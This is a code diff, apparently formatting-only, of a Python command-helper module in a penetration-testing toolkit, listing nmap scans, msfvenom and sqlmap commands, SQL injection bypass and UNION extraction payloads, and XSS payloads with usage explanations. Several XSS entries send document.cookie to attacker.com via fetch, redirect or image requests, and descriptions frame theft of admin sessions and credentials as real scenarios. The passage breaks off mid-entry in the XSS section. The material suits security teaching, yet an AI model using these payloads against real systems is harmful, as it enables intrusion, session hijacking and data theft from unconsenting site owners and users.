@@ -151,15 +151,10 @@ class CommandHelper(BaseModule):
             print(f"\n\033[93mFound {len(results)} matching commands:\033[0m")
             for i, result in enumerate(results, 1):
                 print(
-                    f"\n\033[96m{i}. {result['tool']} - "
-                    f"{result['category']}\033[0m"
+                    f"\n\033[96m{i}. {result['tool']} - " f"{result['category']}\033[0m"
                 )
-                print(
-                    f"   Command: \033[92m{result['command']}\033[0m"
-                )
-                print(
-                    f"   Description: {result['description']}"
-                )
+                print(f"   Command: \033[92m{result['command']}\033[0m")
+                print(f"   Description: {result['description']}")
 
                 if i % 5 == 0 and i < len(results):
                     more = self.get_user_input(
@@ -168,9 +163,7 @@ class CommandHelper(BaseModule):
                     if more and more.lower() == "q":
                         break
         else:
-            self.print_warning(
-                f"No commands found for keyword '{keyword}'"
-            )
+            self.print_warning(f"No commands found for keyword '{keyword}'")
 
     def _vulnerability_references(self):
         """Display vulnerability references and exploitation techniques"""
@@ -456,132 +449,164 @@ class CommandHelper(BaseModule):
             "🎯 Basic Scans (Perfect for Beginners)": [
                 (
                     "nmap 192.168.1.1",
-                    ("Basic port scan - scans top 1000 most common ports\n"
-                     "   Best for: Initial reconnaissance of a single target\n"
-                     "   Speed: Fast | Stealth: Medium | Info: Basic port "
-                     "states\n"
-                     "   Example: nmap google.com (finds web servers, "
-                     "mail servers)\n"
-                     "   Real scenario: CTF box discovery, network asset "
-                     "inventory"),
+                    (
+                        "Basic port scan - scans top 1000 most common ports\n"
+                        "   Best for: Initial reconnaissance of a single target\n"
+                        "   Speed: Fast | Stealth: Medium | Info: Basic port "
+                        "states\n"
+                        "   Example: nmap google.com (finds web servers, "
+                        "mail servers)\n"
+                        "   Real scenario: CTF box discovery, network asset "
+                        "inventory"
+                    ),
                 ),
                 (
                     "nmap -sn 192.168.1.0/24",
-                    ("Ping scan (host discovery) - finds live hosts without "
-                     "port scanning\n"
-                     "   Best for: Discovering which hosts are online in a "
-                     "network\n"
-                     "   Example: nmap -sn 192.168.1.0/24 → finds\n"
-                     "           192.168.1.1, 192.168.1.100, etc.\n"
-                     "   Real scenario: Home network audit, office network "
-                     "mapping"),
+                    (
+                        "Ping scan (host discovery) - finds live hosts without "
+                        "port scanning\n"
+                        "   Best for: Discovering which hosts are online in a "
+                        "network\n"
+                        "   Example: nmap -sn 192.168.1.0/24 → finds\n"
+                        "           192.168.1.1, 192.168.1.100, etc.\n"
+                        "   Real scenario: Home network audit, office network "
+                        "mapping"
+                    ),
                 ),
                 (
                     "nmap -sS 192.168.1.1",
-                    ("SYN stealth scan - sends SYN packets without completing "
-                     "handshake\n"
-                     "   Best for: Stealthy reconnaissance, avoiding logs\n"
-                     "   How it works: Sends TCP SYN → receives SYN-ACK → "
-                     "sends RST\n"
-                     "   Example: nmap -sS target.com (quieter than full "
-                     "connection)\n"
-                     "   Real scenario: Penetration testing, avoiding IDS "
-                     "detection"),
+                    (
+                        "SYN stealth scan - sends SYN packets without completing "
+                        "handshake\n"
+                        "   Best for: Stealthy reconnaissance, avoiding logs\n"
+                        "   How it works: Sends TCP SYN → receives SYN-ACK → "
+                        "sends RST\n"
+                        "   Example: nmap -sS target.com (quieter than full "
+                        "connection)\n"
+                        "   Real scenario: Penetration testing, avoiding IDS "
+                        "detection"
+                    ),
                 ),
                 (
                     "nmap -sT 192.168.1.1",
-                    ("TCP connect scan - completes full TCP handshake\n"
-                     "   Best for: When you don't have administrator/root "
-                     "privileges\n"
-                     "   Trade-off: More reliable but easier to detect and "
-                     "log\n"
-                     "   Example: nmap -sT hackthebox.eu (works without "
-                     "sudo)\n"
-                     "   Real scenario: Scanning from shared hosting, limited "
-                     "user accounts"),
+                    (
+                        "TCP connect scan - completes full TCP handshake\n"
+                        "   Best for: When you don't have administrator/root "
+                        "privileges\n"
+                        "   Trade-off: More reliable but easier to detect and "
+                        "log\n"
+                        "   Example: nmap -sT hackthebox.eu (works without "
+                        "sudo)\n"
+                        "   Real scenario: Scanning from shared hosting, limited "
+                        "user accounts"
+                    ),
                 ),
                 (
                     "nmap -p 1-1000 192.168.1.1",
-                    ("Scan first 1000 ports (covers most common services)\n"
-                     "   Best for: Comprehensive but not exhaustive scanning\n"
-                     "   Speed: Medium | Coverage: High for standard "
-                     "services"),
+                    (
+                        "Scan first 1000 ports (covers most common services)\n"
+                        "   Best for: Comprehensive but not exhaustive scanning\n"
+                        "   Speed: Medium | Coverage: High for standard "
+                        "services"
+                    ),
                 ),
                 (
                     "nmap --top-ports 100 192.168.1.1",
-                    ("Scan the 100 most commonly used ports\n"
-                     "   Best for: Quick reconnaissance with excellent "
-                     "coverage\n"
-                     "   Efficiency: Finds 90% of services in minimal time"),
+                    (
+                        "Scan the 100 most commonly used ports\n"
+                        "   Best for: Quick reconnaissance with excellent "
+                        "coverage\n"
+                        "   Efficiency: Finds 90% of services in minimal time"
+                    ),
                 ),
                 (
                     "nmap -A 192.168.1.1",
-                    ("Aggressive scan: OS + version detection + default "
-                     "scripts\n"
-                     "   Best for: Maximum information in one command\n"
-                     "   ⚠️ WARNING: Very noisy, easily detected by security "
-                     "systems"),
+                    (
+                        "Aggressive scan: OS + version detection + default "
+                        "scripts\n"
+                        "   Best for: Maximum information in one command\n"
+                        "   ⚠️ WARNING: Very noisy, easily detected by security "
+                        "systems"
+                    ),
                 ),
             ],
             "🎯 Smart Port Selection": [
                 (
                     "nmap -p 22,80,443 192.168.1.1",
-                    ("Scan critical ports: SSH (22), HTTP (80), HTTPS (443)\n"
-                     "   Best for: Quick check of essential services\n"
-                     "   Use case: Web servers, remote access verification"),
+                    (
+                        "Scan critical ports: SSH (22), HTTP (80), HTTPS (443)\n"
+                        "   Best for: Quick check of essential services\n"
+                        "   Use case: Web servers, remote access verification"
+                    ),
                 ),
                 (
                     "nmap -p- 192.168.1.1",
-                    ("Scan ALL 65535 ports (comprehensive but slow)\n"
-                     "   Best for: CTF challenges, complete discovery\n"
-                     "   ⚠️ WARNING: Very slow (hours), may trigger security "
-                     "alerts"),
+                    (
+                        "Scan ALL 65535 ports (comprehensive but slow)\n"
+                        "   Best for: CTF challenges, complete discovery\n"
+                        "   ⚠️ WARNING: Very slow (hours), may trigger security "
+                        "alerts"
+                    ),
                 ),
                 (
                     "nmap -O 192.168.1.1",
-                    ("Operating system detection - identifies target OS\n"
-                     "   Discovers: Windows 10, Ubuntu 20.04, CentOS 7\n"
-                     "   How: Analyzes TCP/IP stack behavior patterns"),
+                    (
+                        "Operating system detection - identifies target OS\n"
+                        "   Discovers: Windows 10, Ubuntu 20.04, CentOS 7\n"
+                        "   How: Analyzes TCP/IP stack behavior patterns"
+                    ),
                 ),
                 (
                     "nmap -f 192.168.1.1",
-                    ("Fragment packets to evade simple firewalls\n"
-                     "   Best for: Bypassing basic packet filtering\n"
-                     "   How: Splits scan packets into smaller fragments"),
+                    (
+                        "Fragment packets to evade simple firewalls\n"
+                        "   Best for: Bypassing basic packet filtering\n"
+                        "   How: Splits scan packets into smaller fragments"
+                    ),
                 ),
                 (
                     "nmap -T4 192.168.1.1",
-                    ("Aggressive timing - faster but more detectable\n"
-                     "   Best for: Internal networks, time-sensitive scanning\n"
-                     "   Speed: Fast | Detection risk: Medium-High"),
+                    (
+                        "Aggressive timing - faster but more detectable\n"
+                        "   Best for: Internal networks, time-sensitive scanning\n"
+                        "   Speed: Fast | Detection risk: Medium-High"
+                    ),
                 ),
                 (
                     "nmap -f 192.168.1.1",
-                    ("Fragment packets to evade simple firewalls\n"
-                     "   Best for: Bypassing basic packet filtering\n"
-                     "   How: Splits scan packets into smaller fragments"),
+                    (
+                        "Fragment packets to evade simple firewalls\n"
+                        "   Best for: Bypassing basic packet filtering\n"
+                        "   How: Splits scan packets into smaller fragments"
+                    ),
                 ),
             ],
             "💾 Saving Your Results": [
                 (
                     "nmap -oN scan_results.txt 192.168.1.1",
-                    ("Save human-readable output to text file\n"
-                     "   Best for: Reading results later, including in "
-                     "reports\n"
-                     "   Format: Same as what you see on screen"),
+                    (
+                        "Save human-readable output to text file\n"
+                        "   Best for: Reading results later, including in "
+                        "reports\n"
+                        "   Format: Same as what you see on screen"
+                    ),
                 ),
                 (
                     "nmap -oX scan_results.xml 192.168.1.1",
-                    ("Save XML output for automated processing\n"
-                     "   Best for: Importing into other security tools\n"
-                     "   Compatible with: Metasploit, Nessus, custom scripts"),
+                    (
+                        "Save XML output for automated processing\n"
+                        "   Best for: Importing into other security tools\n"
+                        "   Compatible with: Metasploit, Nessus, custom scripts"
+                    ),
                 ),
                 (
                     "nmap -oA complete_scan 192.168.1.1",
-                    ("Save in ALL formats (.nmap, .xml, .gnmap)\n"
-                     "   Best for: Comprehensive documentation\n"
-                     "   Creates: 3 files with different formats for various "
-                     "uses"),
+                    (
+                        "Save in ALL formats (.nmap, .xml, .gnmap)\n"
+                        "   Best for: Comprehensive documentation\n"
+                        "   Creates: 3 files with different formats for various "
+                        "uses"
+                    ),
                 ),
             ],
         }
@@ -591,30 +616,21 @@ class CommandHelper(BaseModule):
             print("-" * len(category.encode("ascii", "ignore")))
 
             for i, (command, description) in enumerate(command_list, 1):
-                print(
-                    f"\n\033[94m{i}. Command:\033[0m \033[92m{command}\033[0m"
-                )
+                print(f"\n\033[94m{i}. Command:\033[0m \033[92m{command}\033[0m")
                 print(f"\033[93m   {description}\033[0m")
 
         print("\n\033[96m🎓 BEGINNER'S SCANNING STRATEGY:\033[0m")
         print("1. START: nmap -T3 192.168.1.1 (basic scan)")
         print(
-            "2. DISCOVER: nmap -sV -p <found_ports> 192.168.1.1 "
-            "(version detection)"
+            "2. DISCOVER: nmap -sV -p <found_ports> 192.168.1.1 " "(version detection)"
         )
         print("3. WEB CHECK: nmap --script http-enum -p 80,443 192.168.1.1")
         print("4. VULNERABILITY: nmap --script vuln -p <ports> 192.168.1.1")
         print("5. DOCUMENT: nmap -oA final_scan 192.168.1.1")
 
         print("\n\033[91m⚠️  CRITICAL LEGAL WARNINGS:\033[0m")
-        print(
-            "• Only scan networks you own or have explicit written "
-            "permission"
-        )
-        print(
-            "• Port scanning without permission is illegal in many "
-            "jurisdictions"
-        )
+        print("• Only scan networks you own or have explicit written " "permission")
+        print("• Port scanning without permission is illegal in many " "jurisdictions")
         print("• Aggressive scans can crash services and cause downtime")
         print("• Always get authorization before testing production systems")
 
@@ -655,8 +671,10 @@ class CommandHelper(BaseModule):
                 ("show payloads", "Show compatible payloads"),
                 ("generate -f exe -o payload.exe", "Generate standalone payload"),
                 (
-                    ("msfvenom -p <payload> LHOST=<ip> LPORT=<port> -f exe > "
-                     "payload.exe"),
+                    (
+                        "msfvenom -p <payload> LHOST=<ip> LPORT=<port> -f exe > "
+                        "payload.exe"
+                    ),
                     "Generate with msfvenom",
                 ),
             ],
@@ -714,17 +732,14 @@ class CommandHelper(BaseModule):
                 ("sqlmap -u '<url>'", "Basic SQL injection test"),
                 ("sqlmap -u '<url>' --dbs", "Enumerate databases"),
                 ("sqlmap -u '<url>' -D <db> --tables", "Enumerate tables"),
-                ("sqlmap -u '<url>' -D <db> -T <table> --columns",
-                 "Enumerate columns"),
-                ("sqlmap -u '<url>' -D <db> -T <table> -C <col> --dump",
-                 "Dump data"),
+                ("sqlmap -u '<url>' -D <db> -T <table> --columns", "Enumerate columns"),
+                ("sqlmap -u '<url>' -D <db> -T <table> -C <col> --dump", "Dump data"),
             ],
             "Request Options": [
                 ("--cookie='JSESSIONID=...'", "Use cookies"),
                 ("--user-agent='...'", "Custom user agent"),
                 ("--referer='...'", "Custom referer"),
-                ("--headers='X-Forwarded-For: 127.0.0.1'",
-                 "Custom headers"),
+                ("--headers='X-Forwarded-For: 127.0.0.1'", "Custom headers"),
                 ("--method=POST", "Use POST method"),
                 ("--data='param=value'", "POST data"),
             ],
@@ -765,139 +780,175 @@ class CommandHelper(BaseModule):
             "🎯 Basic Authentication Bypass": [
                 (
                     "' OR '1'='1",
-                    ("Classic bypass - makes condition always true\n"
-                     "   Use: Login forms, search boxes\n"
-                     "   How: Breaks out of quotes and adds always-true condition\n"
-                     "   Example: Username: admin' OR '1'='1 | Password: anything\n"
-                     "   Real scenario: Admin panels, customer portals, "
-                     "database interfaces"),
+                    (
+                        "Classic bypass - makes condition always true\n"
+                        "   Use: Login forms, search boxes\n"
+                        "   How: Breaks out of quotes and adds always-true condition\n"
+                        "   Example: Username: admin' OR '1'='1 | Password: anything\n"
+                        "   Real scenario: Admin panels, customer portals, "
+                        "database interfaces"
+                    ),
                 ),
                 (
                     "' OR 1=1--",
-                    ("Same as above but uses SQL comment (--) to ignore rest\n"
-                     "   Use: When there's additional SQL code after injection point\n"
-                     "   How: Comments out password check or other conditions\n"
-                     "   Example: Login query becomes: WHERE user='admin' OR 1=1-- "
-                     "AND pass='...\n"
-                     "   Real scenario: Legacy applications, custom authentication "
-                     "systems"),
+                    (
+                        "Same as above but uses SQL comment (--) to ignore rest\n"
+                        "   Use: When there's additional SQL code after injection point\n"
+                        "   How: Comments out password check or other conditions\n"
+                        "   Example: Login query becomes: WHERE user='admin' OR 1=1-- "
+                        "AND pass='...\n"
+                        "   Real scenario: Legacy applications, custom authentication "
+                        "systems"
+                    ),
                 ),
                 (
                     "admin'--",
-                    ("Assumes username 'admin' exists, ignores password\n"
-                     "   Use: When you know a valid username\n"
-                     "   How: Closes username quote and comments out password check\n"
-                     "   Example: Username: admin'-- | Password: (ignored)\n"
-                     "   Real scenario: WordPress admin, CMS backends, database tools"),
+                    (
+                        "Assumes username 'admin' exists, ignores password\n"
+                        "   Use: When you know a valid username\n"
+                        "   How: Closes username quote and comments out password check\n"
+                        "   Example: Username: admin'-- | Password: (ignored)\n"
+                        "   Real scenario: WordPress admin, CMS backends, database tools"
+                    ),
                 ),
                 (
                     "') OR '1'='1",
-                    ("For queries using parentheses around conditions\n"
-                     "   Use: When original query has complex WHERE clauses\n"
-                     "   How: Closes parentheses before adding bypass condition\n"
-                     "   Example: WHERE (username='user' AND active=1) becomes "
-                     "(username='user') OR '1'='1\n"
-                     "   Real scenario: Enterprise applications, multi-condition "
-                     "authentication"),
+                    (
+                        "For queries using parentheses around conditions\n"
+                        "   Use: When original query has complex WHERE clauses\n"
+                        "   How: Closes parentheses before adding bypass condition\n"
+                        "   Example: WHERE (username='user' AND active=1) becomes "
+                        "(username='user') OR '1'='1\n"
+                        "   Real scenario: Enterprise applications, multi-condition "
+                        "authentication"
+                    ),
                 ),
             ],
             "🔍 Union-Based SQL Injection (Data Extraction)": [
                 (
                     "' UNION SELECT 1,2,3--",
-                    ("Determines number of columns in original query\n"
-                     "   Use: First step in UNION attacks\n"
-                     "   How: Tests if 3 columns exist; adjust numbers until no error\n"
-                     "   Example: Search box → product' UNION SELECT 1,2,3-- \n"
-                     "   Real scenario: E-commerce product search, news article lookup"),
+                    (
+                        "Determines number of columns in original query\n"
+                        "   Use: First step in UNION attacks\n"
+                        "   How: Tests if 3 columns exist; adjust numbers until no error\n"
+                        "   Example: Search box → product' UNION SELECT 1,2,3-- \n"
+                        "   Real scenario: E-commerce product search, news article lookup"
+                    ),
                 ),
                 (
                     "' UNION SELECT user(),database(),version()--",
-                    ("Extracts database username, name, and version\n"
-                     "   Use: Gathering system information\n"
-                     "   How: Uses MySQL functions to get server details\n"
-                     "   Example: Returns → root@localhost, shop_db, MySQL 5.7.3\n"
-                     "   Real scenario: Fingerprinting database for targeted attacks"),
+                    (
+                        "Extracts database username, name, and version\n"
+                        "   Use: Gathering system information\n"
+                        "   How: Uses MySQL functions to get server details\n"
+                        "   Example: Returns → root@localhost, shop_db, MySQL 5.7.3\n"
+                        "   Real scenario: Fingerprinting database for targeted attacks"
+                    ),
                 ),
                 (
-                    ("' UNION SELECT 1,group_concat(table_name),3 FROM "
-                     "information_schema.tables--"),
-                    ("Lists all table names in the database\n"
-                     "   Use: Finding interesting tables to target\n"
-                     "   How: Queries information_schema (MySQL's metadata tables)\n"
-                     "   Example: Returns → users,orders,products,admin_logs,"
-                     "payment_info\n"
-                     "   Real scenario: Finding sensitive data tables like credit "
-                     "cards"),
+                    (
+                        "' UNION SELECT 1,group_concat(table_name),3 FROM "
+                        "information_schema.tables--"
+                    ),
+                    (
+                        "Lists all table names in the database\n"
+                        "   Use: Finding interesting tables to target\n"
+                        "   How: Queries information_schema (MySQL's metadata tables)\n"
+                        "   Example: Returns → users,orders,products,admin_logs,"
+                        "payment_info\n"
+                        "   Real scenario: Finding sensitive data tables like credit "
+                        "cards"
+                    ),
                 ),
                 (
-                    ("' UNION SELECT 1,group_concat(column_name),3 FROM "
-                     "information_schema.columns WHERE table_name='users'--"),
-                    ("Lists column names in 'users' table\n"
-                     "   Use: Finding username/password column names\n"
-                     "   How: Targets specific table to understand its structure\n"
-                     "   Example: Returns → id,username,email,password_hash,is_admin\n"
-                     "   Real scenario: Preparing to extract user credentials"),
+                    (
+                        "' UNION SELECT 1,group_concat(column_name),3 FROM "
+                        "information_schema.columns WHERE table_name='users'--"
+                    ),
+                    (
+                        "Lists column names in 'users' table\n"
+                        "   Use: Finding username/password column names\n"
+                        "   How: Targets specific table to understand its structure\n"
+                        "   Example: Returns → id,username,email,password_hash,is_admin\n"
+                        "   Real scenario: Preparing to extract user credentials"
+                    ),
                 ),
             ],
             "⏱️ Time-Based Blind SQL Injection": [
                 (
                     "' OR SLEEP(5)--",
-                    ("MySQL: Causes 5-second delay if injection works\n"
-                     "   Use: When you can't see query results directly\n"
-                     "   How: If page loads 5 seconds slower, injection succeeded\n"
-                     "   Example: Login form → username: admin' OR SLEEP(5)-- \n"
-                     "   Real scenario: Testing if vulnerable when error messages "
-                     "hidden"),
+                    (
+                        "MySQL: Causes 5-second delay if injection works\n"
+                        "   Use: When you can't see query results directly\n"
+                        "   How: If page loads 5 seconds slower, injection succeeded\n"
+                        "   Example: Login form → username: admin' OR SLEEP(5)-- \n"
+                        "   Real scenario: Testing if vulnerable when error messages "
+                        "hidden"
+                    ),
                 ),
                 (
                     "'; WAITFOR DELAY '00:00:05'--",
-                    ("SQL Server: Same as SLEEP but for Microsoft SQL Server\n"
-                     "   Use: When targeting Windows/MSSQL environments\n"
-                     "   How: Waits 5 seconds before continuing execution\n"
-                     "   Example: Search → query'; WAITFOR DELAY '00:00:05'-- \n"
-                     "   Real scenario: Corporate intranets running Windows Server"),
+                    (
+                        "SQL Server: Same as SLEEP but for Microsoft SQL Server\n"
+                        "   Use: When targeting Windows/MSSQL environments\n"
+                        "   How: Waits 5 seconds before continuing execution\n"
+                        "   Example: Search → query'; WAITFOR DELAY '00:00:05'-- \n"
+                        "   Real scenario: Corporate intranets running Windows Server"
+                    ),
                 ),
                 (
                     "'; SELECT pg_sleep(5)--",
-                    ("PostgreSQL: Delay function for PostgreSQL databases\n"
-                     "   Use: When targeting PostgreSQL servers\n"
-                     "   How: PostgreSQL-specific sleep function\n"
-                     "   Example: ID parameter → ?id=1'; SELECT pg_sleep(5)-- \n"
-                     "   Real scenario: Modern web apps using PostgreSQL"),
+                    (
+                        "PostgreSQL: Delay function for PostgreSQL databases\n"
+                        "   Use: When targeting PostgreSQL servers\n"
+                        "   How: PostgreSQL-specific sleep function\n"
+                        "   Example: ID parameter → ?id=1'; SELECT pg_sleep(5)-- \n"
+                        "   Real scenario: Modern web apps using PostgreSQL"
+                    ),
                 ),
                 (
                     "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
-                    ("Advanced MySQL delay using subquery\n"
-                     "   Use: When simple SLEEP() is filtered\n"
-                     "   How: Bypasses some WAF filters by using subquery structure\n"
-                     "   Example: Bypasses ModSecurity rules blocking SLEEP()\n"
-                     "   Real scenario: Applications with Web Application Firewalls"),
+                    (
+                        "Advanced MySQL delay using subquery\n"
+                        "   Use: When simple SLEEP() is filtered\n"
+                        "   How: Bypasses some WAF filters by using subquery structure\n"
+                        "   Example: Bypasses ModSecurity rules blocking SLEEP()\n"
+                        "   Real scenario: Applications with Web Application Firewalls"
+                    ),
                 ),
             ],
             "✅ Boolean-Based Blind SQL Injection": [
                 (
                     "' AND 1=1--",
-                    ("Always true condition - should return normal results\n"
-                     "   Use: Testing if blind injection works\n"
-                     "   How: If page looks normal, injection point exists"),
+                    (
+                        "Always true condition - should return normal results\n"
+                        "   Use: Testing if blind injection works\n"
+                        "   How: If page looks normal, injection point exists"
+                    ),
                 ),
                 (
                     "' AND 1=2--",
-                    ("Always false condition - should return no/different results\n"
-                     "   Use: Confirming blind injection by comparing with 1=1\n"
-                     "   How: If page differs from 1=1 test, you have blind injection"),
+                    (
+                        "Always false condition - should return no/different results\n"
+                        "   Use: Confirming blind injection by comparing with 1=1\n"
+                        "   How: If page differs from 1=1 test, you have blind injection"
+                    ),
                 ),
                 (
                     "' AND (SELECT SUBSTRING(@@version,1,1))='5'--",
-                    ("Tests if database version starts with '5' (MySQL 5.x)\n"
-                     "   Use: Fingerprinting database version\n"
-                     "   How: Change number to identify exact version"),
+                    (
+                        "Tests if database version starts with '5' (MySQL 5.x)\n"
+                        "   Use: Fingerprinting database version\n"
+                        "   How: Change number to identify exact version"
+                    ),
                 ),
                 (
                     "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
-                    ("Tests if information_schema exists (confirms MySQL/PostgreSQL)\n"
-                     "   Use: Database fingerprinting\n"
-                     "   How: Only MySQL and PostgreSQL have information_schema"),
+                    (
+                        "Tests if information_schema exists (confirms MySQL/PostgreSQL)\n"
+                        "   Use: Database fingerprinting\n"
+                        "   How: Only MySQL and PostgreSQL have information_schema"
+                    ),
                 ),
             ],
         }
@@ -943,131 +994,161 @@ class CommandHelper(BaseModule):
             "🎯 Basic XSS Payloads (Start Here)": [
                 (
                     "<script>alert('XSS')</script>",
-                    ("Classic JavaScript execution test\n"
-                     "   Use: Testing if XSS is possible at all\n"
-                     "   How: Injects JavaScript that shows alert popup\n"
-                     "   Example: Search box, comment forms, user profiles\n"
-                     "   Real scenario: Testing input validation on web forms"),
+                    (
+                        "Classic JavaScript execution test\n"
+                        "   Use: Testing if XSS is possible at all\n"
+                        "   How: Injects JavaScript that shows alert popup\n"
+                        "   Example: Search box, comment forms, user profiles\n"
+                        "   Real scenario: Testing input validation on web forms"
+                    ),
                 ),
                 (
                     "<img src=x onerror=alert('XSS')>",
-                    ("Image tag with error handler - bypasses script tag filters\n"
-                     "   Use: When <script> tags are blocked\n"
-                     "   How: Invalid image src triggers onerror event\n"
-                     "   Example: Profile picture upload, image galleries\n"
-                     "   Real scenario: Bypassing WAF rules that block script tags"),
+                    (
+                        "Image tag with error handler - bypasses script tag filters\n"
+                        "   Use: When <script> tags are blocked\n"
+                        "   How: Invalid image src triggers onerror event\n"
+                        "   Example: Profile picture upload, image galleries\n"
+                        "   Real scenario: Bypassing WAF rules that block script tags"
+                    ),
                 ),
                 (
                     "javascript:alert('XSS')",
-                    ("JavaScript protocol in href attributes\n"
-                     "   Use: In link href attributes\n"
-                     "   How: Executes JavaScript when link is clicked\n"
-                     "   Example: User profile links, navigation menus\n"
-                     "   Real scenario: Social media profile links, user-generated content"),
+                    (
+                        "JavaScript protocol in href attributes\n"
+                        "   Use: In link href attributes\n"
+                        "   How: Executes JavaScript when link is clicked\n"
+                        "   Example: User profile links, navigation menus\n"
+                        "   Real scenario: Social media profile links, user-generated content"
+                    ),
                 ),
                 (
                     "<svg onload=alert('XSS')>",
-                    ("SVG with onload event - modern XSS technique\n"
-                     "   Use: When traditional methods are filtered\n"
-                     "   How: SVG onload event executes when image loads\n"
-                     "   Example: Image uploads, avatar systems\n"
-                     "   Real scenario: Modern web applications with SVG support"),
+                    (
+                        "SVG with onload event - modern XSS technique\n"
+                        "   Use: When traditional methods are filtered\n"
+                        "   How: SVG onload event executes when image loads\n"
+                        "   Example: Image uploads, avatar systems\n"
+                        "   Real scenario: Modern web applications with SVG support"
+                    ),
                 ),
             ],
             "🔍 Reflected XSS (Non-Persistent)": [
                 (
                     "<script>alert(document.cookie)</script>",
-                    ("Steals user cookies - most common XSS attack\n"
-                     "   Use: When you want to steal session data\n"
-                     "   How: Accesses browser's cookie storage\n"
-                     "   Example: Search results, error messages, URL parameters\n"
-                     "   Real scenario: Stealing admin sessions, user authentication"),
+                    (
+                        "Steals user cookies - most common XSS attack\n"
+                        "   Use: When you want to steal session data\n"
+                        "   How: Accesses browser's cookie storage\n"
+                        "   Example: Search results, error messages, URL parameters\n"
+                        "   Real scenario: Stealing admin sessions, user authentication"
+                    ),
                 ),
                 (
                     "<script>fetch('http://attacker.com?cookie='+document.cookie)</script>",
-                    ("Sends stolen cookies to attacker's server\n"
-                     "   Use: When you control a server to receive stolen data\n"
-                     "   How: Makes HTTP request with stolen cookies\n"
-                     "   Example: Advanced cookie theft for session hijacking\n"
-                     "   Real scenario: Professional penetration testing, red teaming"),
+                    (
+                        "Sends stolen cookies to attacker's server\n"
+                        "   Use: When you control a server to receive stolen data\n"
+                        "   How: Makes HTTP request with stolen cookies\n"
+                        "   Example: Advanced cookie theft for session hijacking\n"
+                        "   Real scenario: Professional penetration testing, red teaming"
+                    ),
                 ),
                 (
                     "<script>document.location='http://attacker.com?cookie='+document.cookie</script>",
-                    ("Redirects victim to attacker's site with stolen cookies\n"
-                     "   Use: When fetch() is blocked or unavailable\n"
-                     "   How: Redirects browser to attacker's server\n"
-                     "   Example: Alternative to fetch() for data exfiltration\n"
-                     "   Real scenario: Bypassing Content Security Policy restrictions"),
+                    (
+                        "Redirects victim to attacker's site with stolen cookies\n"
+                        "   Use: When fetch() is blocked or unavailable\n"
+                        "   How: Redirects browser to attacker's server\n"
+                        "   Example: Alternative to fetch() for data exfiltration\n"
+                        "   Real scenario: Bypassing Content Security Policy restrictions"
+                    ),
                 ),
             ],
             "💾 Stored XSS (Persistent)": [
                 (
                     "<script>alert('Stored XSS')</script>",
-                    ("Persistent XSS that affects all users\n"
-                     "   Use: When payload is stored in database\n"
-                     "   How: Executes for every user who views the page\n"
-                     "   Example: Comments, forum posts, user profiles\n"
-                     "   Real scenario: Social media platforms, comment systems"),
+                    (
+                        "Persistent XSS that affects all users\n"
+                        "   Use: When payload is stored in database\n"
+                        "   How: Executes for every user who views the page\n"
+                        "   Example: Comments, forum posts, user profiles\n"
+                        "   Real scenario: Social media platforms, comment systems"
+                    ),
                 ),
                 (
                     "<script>var img=new Image();img.src='http://attacker.com?cookie='+document.cookie;</script>",
-                    ("Stealthy cookie theft using image object\n"
-                     "   Use: When you want to avoid redirects\n"
-                     "   How: Creates invisible image request with stolen data\n"
-                     "   Example: More subtle than redirect-based theft\n"
-                     "   Real scenario: Advanced persistent threats, targeted attacks"),
+                    (
+                        "Stealthy cookie theft using image object\n"
+                        "   Use: When you want to avoid redirects\n"
+                        "   How: Creates invisible image request with stolen data\n"
+                        "   Example: More subtle than redirect-based theft\n"
+                        "   Real scenario: Advanced persistent threats, targeted attacks"
+                    ),
                 ),
                 (
                     "<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>",
-                    ("Obfuscated XSS using character codes\n"
-                     "   Use: Bypassing simple keyword filters\n"
-                     "   How: Converts 'alert('XSS')' to character codes\n"
-                     "   Example: Bypasses filters looking for 'alert' or 'script'\n"
-                     "   Real scenario: WAF evasion, advanced filtering bypass"),
+                    (
+                        "Obfuscated XSS using character codes\n"
+                        "   Use: Bypassing simple keyword filters\n"
+                        "   How: Converts 'alert('XSS')' to character codes\n"
+                        "   Example: Bypasses filters looking for 'alert' or 'script'\n"
+                        "   Real scenario: WAF evasion, advanced filtering bypass"
+                    ),
                 ),
             ],
             "🛡️ DOM-Based XSS": [
                 (
                     "<script>document.getElementById('demo').innerHTML='<img src=x onerror=alert(1)>'</script>",
-                    ("DOM manipulation XSS\n"
-                     "   Use: When JavaScript modifies page content\n"
-                     "   How: Changes DOM elements to include malicious content\n"
-                     "   Example: Single-page applications, dynamic content\n"
-                     "   Real scenario: Modern web apps using JavaScript frameworks"),
+                    (
+                        "DOM manipulation XSS\n"
+                        "   Use: When JavaScript modifies page content\n"
+                        "   How: Changes DOM elements to include malicious content\n"
+                        "   Example: Single-page applications, dynamic content\n"
+                        "   Real scenario: Modern web apps using JavaScript frameworks"
+                    ),
                 ),
                 (
                     "<script>eval(location.hash.substring(1))</script>",
-                    ("URL fragment-based XSS\n"
-                     "   Use: When page uses URL fragments for functionality\n"
-                     "   How: Executes code from URL after # symbol\n"
-                     "   Example: #alert('XSS') in URL\n"
-                     "   Real scenario: Client-side routing, hash-based navigation"),
+                    (
+                        "URL fragment-based XSS\n"
+                        "   Use: When page uses URL fragments for functionality\n"
+                        "   How: Executes code from URL after # symbol\n"
+                        "   Example: #alert('XSS') in URL\n"
+                        "   Real scenario: Client-side routing, hash-based navigation"
+                    ),
                 ),
             ],
             "🚀 Advanced XSS Techniques": [
                 (
                     "<script>setTimeout('alert(\\'XSS\\')',1000)</script>",
-                    ("Delayed execution XSS\n"
-                     "   Use: When you want delayed execution\n"
-                     "   How: Executes after 1 second delay\n"
-                     "   Example: Bypassing real-time detection systems\n"
-                     "   Real scenario: Evading automated security scanners"),
+                    (
+                        "Delayed execution XSS\n"
+                        "   Use: When you want delayed execution\n"
+                        "   How: Executes after 1 second delay\n"
+                        "   Example: Bypassing real-time detection systems\n"
+                        "   Real scenario: Evading automated security scanners"
+                    ),
                 ),
                 (
                     "<script>setInterval('alert(\\'XSS\\')',2000)</script>",
-                    ("Repeated execution XSS\n"
-                     "   Use: When you want continuous execution\n"
-                     "   How: Executes every 2 seconds\n"
-                     "   Example: Persistent monitoring, continuous data theft\n"
-                     "   Real scenario: Advanced persistent threats"),
+                    (
+                        "Repeated execution XSS\n"
+                        "   Use: When you want continuous execution\n"
+                        "   How: Executes every 2 seconds\n"
+                        "   Example: Persistent monitoring, continuous data theft\n"
+                        "   Real scenario: Advanced persistent threats"
